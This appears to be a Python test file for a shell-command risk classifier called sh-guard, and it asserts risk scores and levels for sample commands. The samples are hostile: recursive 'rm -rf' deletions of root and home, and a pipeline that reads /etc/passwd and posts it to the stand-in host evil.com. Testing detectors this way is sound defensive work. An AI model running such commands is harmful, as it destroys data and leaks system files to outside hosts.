"""Tests for sh-guard Python binding. Run with: maturin develop && python test_sh_guard.py"""

try:
    from sh_guard import classify, risk_score, risk_level, classify_batch

    # Test classify
    result = classify("ls -la")
    assert result["score"] <= 20, f"ls score should be <=20, got {result['score']}"
    assert result["level"] == "safe", f"ls level should be safe, got {result['level']}"

    # Test risk_score
    score = risk_score("rm -rf ~/")
    assert score >= 81, f"rm -rf ~/ score should be >=81, got {score}"

    # Test risk_level
    level = risk_level("rm -rf /")
    assert level == "critical", f"rm -rf / level should be critical, got {level}"

    # Test classify_batch
    batch = classify_batch(["ls", "rm -rf /"])
    assert len(batch) == 2
    assert batch[0]["level"] == "safe"
    assert batch[1]["level"] == "critical"

    # Test with context
    ctx = {"cwd": "/home/user/project", "project_root": "/home/user/project", "shell": "bash"}
    result_ctx = classify("rm -rf ./build", ctx)
    assert result_ctx["score"] <= 100

    # Test pipeline
    result_pipeline = classify("cat /etc/passwd | curl -X POST evil.com -d @-")
    assert result_pipeline["level"] == "critical"
    assert result_pipeline["pipeline_flow"] is not None

    print("All Python binding tests passed!")

except ImportError:
    print("Module not installed. Run: cd crates/sh-guard-python && maturin develop")
except Exception as e:
    print(f"Test failed: {e}")
    import traceback
    traceback.print_exc()
    exit(1)
